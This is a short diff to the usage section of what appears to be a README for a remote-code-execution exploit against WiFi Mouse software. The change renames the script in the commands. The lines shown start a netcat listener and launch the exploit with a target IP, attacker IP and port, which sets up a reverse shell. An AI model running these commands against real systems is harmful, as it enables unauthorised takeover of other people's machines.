@@ -21,7 +21,7 @@ nc -lvnp <port>
 
 2. Run the exploit:
 ```bash
-python3 wifi_mouse_rce.py <target-ip> <attacker-ip> <attacker-port>
+python3 exploit.py <target-ip> <attacker-ip> <attacker-port>
 ```
 
 ### Example
@@ -30,7 +30,7 @@ python3 wifi_mouse_rce.py <target-ip> <attacker-ip> <attacker-port>
 nc -lvnp 4444
 
 # Execute exploit
-python3 wifi_mouse_rce.py 192.168.1.100 192.168.1.200 4444
+python3 exploit.py 192.168.1.100 192.168.1.200 4444
 ```
 
 ## Technical Details
